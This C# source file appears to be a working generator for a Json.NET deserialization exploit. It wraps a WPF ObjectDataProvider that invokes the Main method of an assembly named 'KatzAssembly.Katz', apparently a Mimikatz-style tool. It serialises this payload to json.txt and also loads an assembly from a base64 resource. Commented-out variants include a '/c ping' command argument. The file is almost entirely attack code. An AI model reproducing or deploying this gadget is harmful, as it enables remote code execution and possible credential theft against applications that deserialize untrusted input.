using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization;
using System.Security.Policy;
using System.Windows.Data;

namespace TestLoadb64
{
    public class Program
    {
        [DataContract]
        public class SerializableType
        {
            public Type type;

            // when serializing, store as a string
            [DataMember]
            string TypeString
            {
                get
                {
                    if (type == null)
                        return null;
                    return type.FullName;
                }
                set
                {
                    if (value == null)
                        type = null;
                    else
                    {
                        type = Type.GetType(value);
                    }
                }
            }

            // constructors
            public SerializableType()
            {
                type = null;
            }
            public SerializableType(Type t)
            {
                type = t;
            }

            // allow SerializableType to implicitly be converted to and from System.Type
            static public implicit operator Type(SerializableType stype)
            {
                return stype.type;
            }
            static public implicit operator SerializableType(Type t)
            {
                return new SerializableType(t);
            }

            // overload the == and != operators
            public static bool operator ==(SerializableType a, SerializableType b)
            {
                // If both are null, or both are same instance, return true.
                if (System.Object.ReferenceEquals(a, b))
                {
                    return true;
                }

                // If one is null, but not both, return false.
                if (((object)a == null) || ((object)b == null))
                {
                    return false;
                }

                // Return true if the fields match:
                return a.type == b.type;
            }
            public static bool operator !=(SerializableType a, SerializableType b)
            {
                return !(a == b);
            }
            // we don't need to overload operators between SerializableType and System.Type because we already enabled them to implicitly convert

            public override int GetHashCode()
            {
                return type.GetHashCode();
            }

            // overload the .Equals method
            public override bool Equals(System.Object obj)
            {
                // If parameter is null return false.
                if (obj == null)
                {
                    return false;
                }

                // If parameter cannot be cast to SerializableType return false.
                SerializableType p = obj as SerializableType;
                if ((System.Object)p == null)
                {
                    return false;
                }

                // Return true if the fields match:
                return (type == p.type);
            }
            public bool Equals(SerializableType p)
            {
                // If parameter is null return false:
                if ((object)p == null)
                {
                    return false;
                }

                // Return true if the fields match:
                return (type == p.type);
            }
        }

        [DataContract]
        public class A
        {
            [DataMember]
            private Dictionary<SerializableType, Type> _bees;
            public Type GetB(Type type)
            {
                return Assembly.Load(Convert.FromBase64String(Properties.Resources.download)).GetType("KatzAssembly.ClassInteractive");//_bees[type];
            }
        }

        static void Main(string[] args)
        {
            Assembly assembly = Assembly.Load("KatzAssembly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=d20870f12ef8c9af");
            //Type type = assembly.GetType("KatzAssembly.ClassInteractive");
            //object instanceOfMyType = Activator.CreateInstance(type);

            MethodInfo methodGetRawBytes = assembly.GetType("KatzAssembly.Katz").GetMethod("Main");
            //object o = methodGetRawBytes.Invoke(assembly, null);
            //byte[] assemblyBytes = (byte[])o;

            //Evidence evidence = new Evidence(Assembly.GetExecutingAssembly().Evidence);

            ObjectDataProvider myODP = new ObjectDataProvider();
            //myODP.ObjectType = assembly.GetType("KatzAssembly.ClassInteractive");
            //myODP.ObjectType = typeof(Assembly);
            //myODP.ObjectType = assembly.GetType("KatzAssembly.Katz");

            //myODP.MethodParameters.Add(Convert.FromBase64String(Properties.Resources.download));
            //myODP.MethodParameters.Add("KatzAssembly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=d20870f12ef8c9af");
            //myODP.MethodParameters.Add(evidence);
            //myODP.MethodParameters.Add("/c ping -t ya.ru");
            myODP.ObjectInstance = methodGetRawBytes;
            myODP.MethodName = "Main";
            //myODP.ConstructorParameters.Add("KatzAssembly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=d20870f12ef8c9af");


            JsonSerializer serializer = new JsonSerializer();
            //serializer.Converters.Add(new JavaScriptDateTimeConverter());
            //serializer.NullValueHandling = NullValueHandling.Ignore;



            using (StreamWriter sw = new StreamWriter(@"json.txt"))
            using (JsonWriter writer = new JsonTextWriter(sw))
            {
                //serializer.MissingMemberHandling = MissingMemberHandling.Ignore;
                //serializer.NullValueHandling = NullValueHandling.Ignore;
                                
                serializer.Serialize(writer, myODP);
                // {"ExpiryDate":new Date(1230375600000),"Price":0}
            }

            //var p = System.Diagnostics.Process.Start("","");

        }
    }
}
